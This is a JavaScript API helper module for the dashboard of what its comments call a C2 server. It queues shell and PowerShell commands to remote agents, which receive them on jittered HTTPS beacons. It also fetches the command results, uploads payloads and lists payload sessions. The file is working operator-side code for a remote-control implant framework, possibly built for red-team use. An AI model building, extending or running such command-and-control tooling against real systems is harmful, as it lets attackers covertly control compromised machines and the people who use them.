/**
 * C2 server API helpers — matches Rust server routes in server/src/main.rs
 * Server runs at https://localhost:3443 (see scripts/queue-command.sh)
 */

/** Base URL for REST calls; Vite dev proxies /api → :3443 */
export function getApiBase() {
  if (import.meta.env.VITE_C2_API_URL) {
    return import.meta.env.VITE_C2_API_URL.replace(/\/$/, '');
  }
  if (typeof window !== 'undefined' && window.location.port === '5173') {
    return '';
  }
  return typeof window !== 'undefined' ? window.location.origin : '';
}

/** WebSocket URL for dashboard live events */
export function getWsUrl() {
  if (import.meta.env.VITE_C2_WS_URL) {
    return import.meta.env.VITE_C2_WS_URL;
  }
  if (typeof window === 'undefined') return 'ws://localhost:3443/api/dashboard/ws';

  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  if (window.location.port === '5173') {
    return `${protocol}//${window.location.hostname}:5173/api/dashboard/ws`;
  }
  return `${protocol}//${window.location.host}/api/dashboard/ws`;
}

/**
 * Queue a shell command for an agent (delivered on next beacon, 20–60s).
 * POST /api/command/queue
 */
export async function queueAgentCommand(agentId, payload, commandType = 'shell') {
  const res = await fetch(`${getApiBase()}/api/command/queue`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      agent_id: agentId,
      command_type: commandType,
      payload,
    }),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Failed to queue command (${res.status})`);
  }

  return res.json();
}

/** GET /api/agents/:id/results */
export async function fetchAgentResults(agentId) {
  const res = await fetch(`${getApiBase()}/api/agents/${agentId}/results`);
  if (!res.ok) throw new Error(`Failed to fetch results (${res.status})`);
  return res.json();
}

/** GET /api/payloads/sessions */
export async function fetchPayloadSessions() {
  const res = await fetch(`${getApiBase()}/api/payloads/sessions`);
  if (!res.ok) throw new Error(`Failed to fetch payload sessions (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

/**
 * POST /api/payloads/upload (multipart)
 * @param {File} file
 * @param {(pct: number) => void} [onProgress]
 */
export function uploadPayload(file, onProgress) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    const formData = new FormData();
    formData.append('file', file);

    xhr.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable && onProgress) {
        onProgress(Math.round((e.loaded / e.total) * 100));
      }
    });

    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          resolve(JSON.parse(xhr.responseText));
        } catch {
          reject(new Error('Invalid server response'));
        }
      } else {
        reject(new Error(xhr.responseText || `Upload failed (${xhr.status})`));
      }
    });

    xhr.addEventListener('error', () => reject(new Error('Network error during upload')));
    xhr.open('POST', `${getApiBase()}/api/payloads/upload`);
    xhr.send(formData);
  });
}

/** Pick command_type based on agent OS (matches agent/src/main.rs handlers) */
export function resolveCommandType(agent, command) {
  const trimmed = command.trim().toLowerCase();
  if (trimmed.startsWith('powershell ') || trimmed === 'powershell') {
    return { commandType: 'powershell', payload: command.replace(/^powershell\s+/i, '') };
  }
  if (trimmed.startsWith('sleep ')) {
    return { commandType: 'sleep', payload: trimmed.replace(/^sleep\s+/, '') };
  }
  const os = (agent?.os ?? '').toLowerCase();
  if (os.includes('windows')) {
    return { commandType: 'shell', payload: command };
  }
  return { commandType: 'shell', payload: command };
}

/** Local-only help text (not sent to C2 server) */
export function getLocalHelpText(agent) {
  const os = (agent?.os ?? '').toLowerCase();
  const shellHint = os.includes('windows')
    ? 'shell commands run via cmd /C'
    : 'shell commands run via sh -c';

  return [
    'C2 Session CLI — commands are queued via POST /api/command/queue',
    'Delivery happens on the agent\'s next HTTPS beacon (20–60s jitter).',
    '',
    'Local commands:',
    '  help              — show this message',
    '',
    'Queued on agent (real execution):',
    '  whoami            — shell: whoami',
    '  dir / ls          — list directory',
    '  hostname          — show hostname',
    '  sleep 5           — agent sleeps 5 seconds',
    `  powershell ...    — Windows PowerShell (${shellHint})`,
    '',
    'Anything else is sent as a shell command to the selected agent.',
  ].join('\n');
}
